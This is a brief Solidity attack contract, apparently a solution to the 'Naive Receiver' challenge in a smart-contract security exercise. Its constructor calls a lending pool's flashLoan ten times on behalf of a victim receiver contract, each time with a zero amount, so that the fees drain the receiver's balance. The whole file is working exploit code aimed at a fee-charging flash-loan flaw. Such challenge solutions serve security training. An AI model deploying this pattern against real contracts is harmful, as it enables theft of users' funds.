// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveAttacker {
    constructor(address payable poolAddress, address receiverAddress) {
        for (uint256 i = 0; i <= 9; i++) {
            NaiveReceiverLenderPool(poolAddress).flashLoan(receiverAddress, 0);
        }
    }
}
